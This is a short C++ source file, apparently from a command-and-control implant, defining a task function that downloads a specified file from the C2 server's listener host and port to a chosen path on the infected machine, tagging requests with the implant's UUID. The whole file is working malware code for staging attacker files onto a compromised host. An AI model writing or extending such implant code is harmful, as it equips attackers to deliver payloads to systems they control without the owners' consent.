#include "core/task.hpp"

namespace Task
{
    std::wstring Upload(State::StateManager& sm, const std::wstring& wSrc, const std::wstring& wDest)
    {
        std::wstring wHeaders = L"X-UUID: " + sm.GetUUID() + L"\r\n";

        // Download a specified file from the C2 server.
        BOOL bResult = System::Http::DownloadFile(
            sm.GetHConnect(),
            sm.GetListenerHost(),
            sm.GetListenerPort(),
            sm.GetReqPathDownload(),
            wHeaders.c_str(),
            wSrc,
            wDest
        );
        if (!bResult)
        {
            return L"Error: Could not download a file.";
        }

        return wDest.c_str();
    }
}